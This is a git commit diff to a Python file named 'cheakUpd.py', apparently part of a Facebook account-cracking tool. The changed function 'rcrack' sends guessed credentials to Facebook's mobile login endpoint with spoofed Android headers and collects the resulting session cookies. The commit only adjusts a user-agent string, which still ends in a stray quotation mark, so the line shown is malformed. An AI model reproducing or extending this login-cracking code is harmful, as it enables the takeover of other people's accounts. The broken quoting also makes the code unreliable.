8a05106e2846a1466e269b1851d1446ff3d3ee61
ITZ-JISAN <127544614+X1X4D-2-0@users.noreply.github.com>
2023-05-16 23:34:01 +0600

    Update cheakUpd.py

--- cheakUpd.py
+++ cheakUpd.py
@@ -488,7 +488,7 @@ def rcrack(uid,pwx,tl):
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
-                'user-agent': ''Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)'',
+                'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)'',
                 'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
